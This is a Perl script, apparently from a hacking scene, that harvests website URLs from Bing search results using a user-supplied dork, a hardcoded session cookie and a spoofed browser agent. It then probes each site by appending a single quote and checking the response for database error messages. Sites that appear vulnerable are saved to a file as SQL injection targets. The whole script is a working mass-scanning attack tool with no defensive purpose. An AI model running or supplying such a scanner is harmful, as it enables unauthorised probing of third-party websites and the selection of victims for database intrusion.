#!/usr/bin/perl
# by CrashBandicot , don't change right noob 

use LWP::UserAgent;
use URI::Escape;

system(($^O eq 'MSWin32') ? 'cls' : 'clear');

if ($#ARGV<0) { 
  print "\n* Put Dork: "; 
  chomp($dor = <STDIN>);
} else { 
  $dor = @ARGV[0]; 
} 

$dork = uri_escape($dor);

$ua = LWP::UserAgent->new( agent => "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5", ssl_opts => { verify_hostname => 0 });
$ua->default_header('Cookie' => "DUP=Q=PSXGUKmNvajefwA97iCO_Q2&T=242618299&A=0&IG=0EBA8D683E8C45DA851B5832FA4E0006; MUID=3CC6FFCD97AE639632EBF95193AE6066; MUIDB=3CC6FFCD97AE639632EBF95193AE6066; SRCHD=D=3896617&AF=MOZSBR; SRCHUID=V=2&GUID=D1F5FF33F6EE47838F259BA42743875B; SRCHUSR=AUTOREDIR=0&GEOVAR=&DOB=20141217; SRCHHPGUSR=CW=1349&CH=657&DPR=1&ADLT=OFF&ISRHTTPS=1; _UR=OMW=1; _HOP=; _SS=SID=DB22F364D53B4F829F92E9E23BE464B7&bIm=979961&HV=1441763905&PC=MOZI; _EDGE_S=mkt=en-us&SID=38381223097C678622A71A3E08706685; SCRHDN=ASD=0&DURL=#; WLS=TS=63577360699; SRCHS=PC=MOZI");
for ($i = 0; $i < 900; $i += 10) {
$p = $ua->get("https://www.bing.com/search?q=".$dork."&qs=n&pq=page.php&sc=8-7&sp=-1&sk=&cvid=34f82b5bdcfc4149babf9e52e69dfea3&first=".$i."&FORM=PERE")->content;

while($p =~ m/<li class=\"b_algo\"><h2><a href=\"(.*?)\" h=\"/g) {

$uri = $1;
$uri =~ s/&amp;/&/gi;
print $uri."\n";

open (TEXT, '>>site_dorked.txt');
print TEXT "$uri\n";
close (TEXT);
}
}

print "\n\t == Grabb Site Vuln ==\n";
open (op, "<site_dorked.txt") or die "$!";
while(<op>) {
chomp($url = $_);


$req = $ua->get($url."%27")->content;
if($req =~ /mysql_/ || $req =~ /mysql_result()/ || $req =~ /mysql_fetch_assoc()/ || $req =~ /mysql_num_rows()/ || $req =~ /mysql_fetch_array()/ || $req =~ /mysql_numrows()/ || $req =~ /mysql_preg_match()/ || $req =~ /ODBC Drivers error/ || $req =~ /InvalidQuerystring/ || $req =~ /SQL syntax/ || $req =~ /JET Database/ || $req =~ /VBScript Runtime/ || $req =~ /OLE DB Provider/) { 

print "\n  [+] ".$url."\n";

open(sa, '>>sqlsite.txt');
print sa "$url\n";
close (sa);
 }
} 

